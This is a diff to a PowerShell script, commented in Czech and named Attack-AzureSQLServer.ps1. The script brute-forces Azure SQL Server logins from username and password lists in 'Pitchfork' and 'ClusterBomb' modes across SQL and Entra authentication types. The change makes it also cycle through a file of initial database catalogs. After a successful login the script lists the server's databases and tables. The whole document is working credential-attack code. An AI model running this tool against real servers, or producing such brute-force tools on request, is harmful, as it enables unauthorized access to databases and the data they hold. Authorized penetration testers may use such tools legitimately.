@@ -12,8 +12,8 @@
 .PARAMETER Port
     The port number to connect to on the Azure SQL Server.
 
-.PARAMETER InitialCatalogue
-    The initial database to connect to.
+.PARAMETER InitialCatalogueFile
+    The file containing a list of initial catalogs to connect to, with each value on a new line.
 
 .PARAMETER UsernamesFile
     The file containing a list of usernames without headers, with each username on a new line.
@@ -28,7 +28,7 @@
     The type of connection string used depending on the allowed authentication method for the SQL database. The options are "EntraPasswordless", "SQL", "EntraPassword", or "EntraIntegrated".
 
 .EXAMPLE
-    .\Attack-AzureSQLServer.ps1 -Server "sqlserver.database.windows.net" -Port 1433 -InitialCatalogue "myDatabase" -UsernamesFile "usernames.txt" -PasswordsFile "passwords.txt" -AttackMode "Pitchfork" -ConnectionMode "SQL"
+    .\Attack-AzureSQLServer.ps1 -Server "sqlserver.database.windows.net" -Port 1433 -InitialCatalogueFile "initialCatalogue.txt" -UsernamesFile "usernames.txt" -PasswordsFile "passwords.txt" -AttackMode "Pitchfork" -ConnectionMode "SQL"
     This command will attempt to connect to the specified SQL Server using the usernames and passwords from the provided files in Pitchfork mode with SQL authentication.
 
 .NOTES
@@ -42,7 +42,7 @@
 param (
     [parameter(Mandatory)][string]$Server,
     [int]$Port=1433,
-    [parameter(Mandatory)][string]$InitialCatalogue,
+    [parameter(Mandatory)][string]$InitialCatalogueFile,
     [parameter(Mandatory)][string]$UsernamesFile,
     [parameter(Mandatory)][string]$PasswordsFile,
     [parameter(Mandatory)]
@@ -52,6 +52,9 @@ param (
     [ValidateSet("EntraPasswordless", "SQL", "EntraPassword", "EntraIntegrated")]
     [string]$ConnectionMode
 )
+
+# Načtení InitialCatalogue z textového souboru
+$initialCatalogues = @(Get-Content -Path $InitialCatalogueFile)
 
 # Hlavicka
 Write-Host ""
@@ -64,7 +67,6 @@ Write-Host "-----------------------------------------------------------------" -
 Write-Host "Attack to Azure SQL Server" -ForegroundColor Cyan
 Write-Host "--> Server Name: $($Server)" -ForegroundColor Blue
 Write-Host "--> Server Port: $($Port)" -ForegroundColor Blue
-Write-Host "--> Initial Catalogue: $($InitialCatalogue)" -ForegroundColor Blue
 Write-Host "--> Attack Mode: $($AttackMode)" -ForegroundColor Blue
 Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow
 
@@ -101,28 +103,28 @@ function Attempt-Connection {
         [int]$TotalTests
     )
 
-# Volba connection stringu na základě režimu připojení
-switch ($ConnectionMode) {
-    "EntraPasswordless" {
-        $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;Authentication='Active Directory Default';"
+    # Volba connection stringu na základě režimu připojení
+    switch ($ConnectionMode) {
+        "EntraPasswordless" {
+            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;Authentication='Active Directory Default';"
+        }
+        "SQL" {
+            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
+        }
+        "EntraPassword" {
+            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Password';"
+        }
+        "EntraIntegrated" {
+            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Integrated';"
+        }
     }
-    "SQL" {
-        $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
-    }
-    "EntraPassword" {
-        $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Password';"
-    }
-    "EntraIntegrated" {
-        $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Integrated';"
-    }
-}
 
     try {
         $connection = New-Object System.Data.SqlClient.SqlConnection
         $connection.ConnectionString = $connectionString
         $connection.Open()
 
-        Write-Host "[$CurrentTest/$TotalTests] Success login with username: $($Username) and password: $($Password)" -ForegroundColor Green
+        Write-Host "[$CurrentTest/$TotalTests] Success login with username: $($Username) and password: $($Password) on catalogue: $($InitialCatalogue)" -ForegroundColor Green
 
         # Výpis databází a tabulek
         $command = $connection.CreateCommand()
@@ -146,7 +148,7 @@ switch ($ConnectionMode) {
         return $true
     }
     catch {
-        Write-Host "[$CurrentTest/$TotalTests] Failed login with username: $($Username) and password: $($Password)" -ForegroundColor Red
+        Write-Host "[$CurrentTest/$TotalTests] Failed login with username: $($Username) and password: $($Password) on catalogue: $($InitialCatalogue)" -ForegroundColor Red
         return $false
     }
 }
@@ -156,27 +158,31 @@ $usernames = @(Get-Content -Path $UsernamesFile)
 $passwords = @(Get-Content -Path $PasswordsFile)
 
 # Výpočet celkového počtu testů
-$totalTests = if ($AttackMode -eq "Pitchfork") { [math]::Min($usernames.Count, $passwords.Count) } else { $usernames.Count * $passwords.Count }
+$totalTests = if ($AttackMode -eq "Pitchfork") { [math]::Min($usernames.Count, $passwords.Count) * $initialCatalogues.Count } else { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
 $currentTest = 0
 
 # Provádění útoku podle zvoleného režimu
 switch ($AttackMode) {
     "Pitchfork" {
-        for ($i = 0; $i -lt $usernames.Count -and $i -lt $passwords.Count; $i++) {
-            $currentTest++
-            $username = $usernames[$i]
-            $password = $passwords[$i]
-            if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
-                break
+        foreach ($InitialCatalogue in $initialCatalogues) {
+            for ($i = 0; $i -lt $usernames.Count -and $i -lt $passwords.Count; $i++) {
+                $currentTest++
+                $username = $usernames[$i]
+                $password = $passwords[$i]
+                if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
+                    break
+                }
             }
         }
     }
     "ClusterBomb" {
-        foreach ($username in $usernames) {
-            foreach ($password in $passwords) {
-                $currentTest++
-                if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
-                    break
+        foreach ($InitialCatalogue in $initialCatalogues) {
+            foreach ($username in $usernames) {
+                foreach ($password in $passwords) {
+                    $currentTest++
+                    if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
+                        break
+                    }
                 }
             }
         }
